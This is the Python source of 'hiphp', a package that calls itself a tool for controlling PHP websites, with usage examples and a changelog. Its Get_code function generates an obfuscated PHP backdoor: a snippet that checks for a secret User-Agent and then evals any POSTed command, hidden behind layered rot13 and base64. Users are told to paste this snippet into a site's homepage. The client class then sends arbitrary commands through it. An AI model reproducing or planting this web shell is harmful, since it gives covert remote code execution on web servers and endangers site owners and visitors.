#!/usr/bin/env python
# coding:utf-8
"""
#set:usage,examples,changelog
##################################################################
# USAGE :
#s
#s
from hiphp import hiphp

hiphp("<PASSWORD>","http://LINK/TO/YOUR/PHP/FILE",<OPTIONS>).run()
#e
#e
##################################################################
# EXAMPLES :
#s
from hiphp import hiphp

# Example:1
# CLI:
hiphp("123","https://localhost/index.php").run()

# Example:2
# Command:
hiphp("123","https://localhost/index.php",False,False).run("-c echo 'hi';")

# Example:3
# Command:
p1=hiphp("123","https://localhost/index.php",True,False).run("-c echo 'hi';")
print(p1)

# Example:4
#-example_4.php content:
'''<?php
    $fp=fopen("test.txt","w+");
    Fwrite($fp,"this is a test");//Writing inside the file
?>'''
# File:
hiphp("123","https://localhost/index.php",False,False).run("example_4.php")

# Example:5
#-example_5.txt content:
'''// prints something like: Wednesday the 15th
    echo date('l \t\h\e jS');'''
# File:
p1=hiphp("123","https://localhost/index.php",True,False).run("example_5.txt")
print(p1)
#e
##################################################################
"""
# VALUES :
#s
__version__="0.1.5"
__name__="hiphp"
__author__="Yasser BDJ (Ro0t96)"
__author_email__="by.root96@gmail.com"
__github_user_name__="byRo0t96"
__title__="hiphp for control php websites."
__description__="A package for controlling a php-based website."
__author_website__="https://byro0t96.github.io/"
__source_code__=f"https://github.com/{__github_user_name__}/{__name__}"
__keywords__=['python','hiphp','php','cli']
__install_requires__=["pipincluder",'requests','ashar','hexor']
__Installation__="pip install "+__name__+"=="+__version__
__license__='Apache Software License'
__license_text__=f'''Copyright (c) 2008->Present, {__author__}
Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.'''
__copyright__='Copyright 2008 -> Present, '+__author__

__changelog__=("## 0.1.5\n - fix bugs.\n\n")
__changelog__=__changelog__+("## 0.1.4\n - fix bugs.\n - new build. \n\n")
__changelog__=__changelog__+("## 0.1.1\n- Import pakages by pipincluder.\n- Fix bugs.\n\n")
__changelog__=__changelog__+("## 0.1.0\n- New build.\n- Fix bugs.\n\n")
__changelog__=__changelog__+("## 0.0.4\n- Fix bugs.\n\n")
__changelog__=__changelog__+("## 0.0.2\n- Fix bugs.\n- Add help list.\n- Add Executing from files.\n\n")
__changelog__=__changelog__+("## 0.0.1\n- First public release.\n\n")
##################################################################
#e

#s
from pipincluder import pipincluder

#import pakages by pipincluder:
exec(pipincluder("import requests",
                 "from ashar import ashar",
                 "from hexor import hexor").modules())
                 
#start hiphp class:
class hiphp:
    def __init__(self,key,url,retur=False,cli=True):
        self.key=ashar(key,key).encode()
        self.url=url
        self.cli=cli
        if self.cli==True:
            self.retur=False
        else:
            self.retur=retur
        self.headers={'User-Agent':self.key}
        self.print=hexor()
        self.print2=hexor(True)
        
    #run:
    def run(self,file=""):
        response=requests.post(self.url,headers=self.headers)
        if response.status_code==200:
            if response.text[0:7]=="#python":
                if self.cli==True:
                    self.print.c("Type PHP commands here:","#31ad22")
                    hiphp.input_command(self.url,self.headers,self.print2,self.retur)
                elif self.cli==False and file!="" and file[0:2]!="-c":
                    try:
                        open_file=open(file).read()
                        if open_file[0:5]=="<?php":
                            open_file=open_file[6:]
                        if open_file[len(open_file)-2:len(open_file)]=="?>":
                            open_file=open_file[:len(open_file)-2]
                        response=hiphp.post(self.url,self.headers,open_file)
                        if self.retur==True:
                            return hiphp.check_errors(response.text,self.print2,self.retur)
                        else:
                            hiphp.check_errors(response.text,self.print2,self.retur)
                    except:
                        self.print.c("The file you entered does not exist.","#ff5b3c")
                elif self.cli==False and file!="" and file[0:2]=="-c":
                    response=hiphp.post(self.url,self.headers,file[3:])
                    if self.retur==True:
                        return hiphp.check_errors(response.text,self.print2,self.retur)
                    else:
                        hiphp.check_errors(response.text,self.print2,self.retur)
                else:
                    self.print.c("A mistake in your entries.","#ff5b3c")
            else:
                self.print.c("We were unable to recognize the hiphp identifier.","#ff5b3c")
                self.print.c("Please copy and paste the following code at the top of the homepage or in another php file, taking into account the path you will enter in the original function.\n","#ff5b3c")
                print(hiphp.Get_code(self.key,self.print2))
                exit()
        else:
            self.print.c("We were unable to connect '"+self.url+"'.","#ff5b3c")
            
    #input_command:
    def input_command(url,headers,p1,retur):
        c=input('hiphp>>>')
        if c:
            response=hiphp.post(url,headers,c)
            if retur==True:
                return hiphp.check_errors(response.text,p1,retur)
            else:
                hiphp.check_errors(response.text,p1,retur)
        else:
            print(p1.c("Command not found!","#ff5b3c"))
        hiphp.input_command(url,headers,p1,retur)
        
    #post:
    def post(url,headers,command):
        ploads={'command':command}#open('php.php').read()
        response=requests.post(url,headers=headers,data=ploads)
        return response

    #check_errors:
    def check_errors(response,p1,retur):
        if response[7:13]!="<br />":
            if retur==False:
                print(response[7:])
            elif retur==True:
                return response[7:]
        else:
            print(p1.c("ERROR in command line.","#ff5b3c"))

    #torot13:
    def rot13(text):
        rot13=str.maketrans("ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz","NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm")
        return str.translate(text,rot13)
        
    #Get_code:
    def Get_code(key,p1):
        login_key=ashar(key,key).encode()
        code="if($_SERVER['HTTP_USER_AGENT']=='"+key+"'){echo'#python';if(isset($_POST['command'])){eval($_POST['command']);}exit;}"
        code=hiphp.rot13(code)
        code=ashar.tob64(code)
        code=hiphp.rot13(code)
        code=ashar.tob64(code)
        code=f"eval(str_rot13(base64_decode(str_rot13(base64_decode('{code}')))));"
        return p1.c("/*php code start*/\n","#31ad22")+p1.c(code,"#539bf5")+p1.c("\n/*php code end*/","#31ad22")
#e